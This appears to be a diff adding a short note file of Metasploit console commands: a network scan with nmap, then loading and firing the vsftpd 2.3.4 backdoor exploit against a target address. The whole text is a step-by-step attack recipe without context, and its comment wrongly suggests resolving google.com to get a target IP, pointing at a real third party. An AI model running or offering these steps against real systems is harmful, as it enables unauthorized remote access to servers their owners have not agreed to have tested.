@@ -1,0 +1,7 @@
+>ifconfig
+>nmap -T4 -A <target ip>
+>search vsftpd 2.3.4
+>use exploit/unix/ftp/vsftpd_234_backdoor
+>show options
+>set rhost <target ip>  //-----to find ip nslookup google.com
+>exploit
